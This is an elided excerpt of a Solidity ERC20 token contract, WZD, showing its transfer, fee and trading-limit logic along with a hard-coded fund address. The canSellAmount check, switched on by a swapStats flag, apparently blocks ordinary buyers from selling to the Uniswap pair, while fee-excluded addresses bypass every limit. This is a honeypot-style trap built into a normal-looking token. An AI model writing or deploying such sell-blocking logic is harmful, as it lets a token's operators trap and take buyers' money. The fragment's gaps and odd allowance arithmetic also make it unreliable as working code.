...
contract WZD is ERC20 {
    using SafeMath for uint256;
	mapping(address => uint256) ldxAmount;
	mapping(address => uint256) outAmount;
    ...
    address _fundAddress = address(0xF8cdf806318E1733C37a9F26d025eb94B1a545A9);
    ...
    constructor(address tokenOwner) ERC20("WZD", "WZD") {
        ...
        uint256 total = 31 * 10**22;
		maxDestroyAmount = 3 * 10**23;
	...
	function canSellAmount(address user) public view returns(uint256){
		if(ldxAmount[user] > balanceOf(user)){
			if(ldxAmount[user] > outAmount[user]){
				return ldxAmount[user].add(outAmount[user]);
			}
		}
		return 0;
	}
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair){
			...
			ldxAmount[from] = ldxAmount[from].add(amount);
        }
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || isAddLdx || balanceOf(_destroyAddress) >= maxDestroyAmount) {
            takeFee = false;
        }else{
			if(from == uniswapV2Pair){
                require(amount <= 10**20,"max amount");
				require(balanceOf(to).add(amount) <= 10**21,"max balance");
            }else if(to == uniswapV2Pair){
                require(amount <= 10**20,"max amount");
				if(swapStats){
					require(canSellAmount(from) >= amount,"SellAmount");
				}
            }else{
                takeFee = false;
				require(balanceOf(to).add(amount) <= 10**21,"max balance");
        ...
        if (takeFee) {
            ...
            if(fundrate > 0){
				...
				amount = amount.div(100).mul(96-fundrate);
			}else{
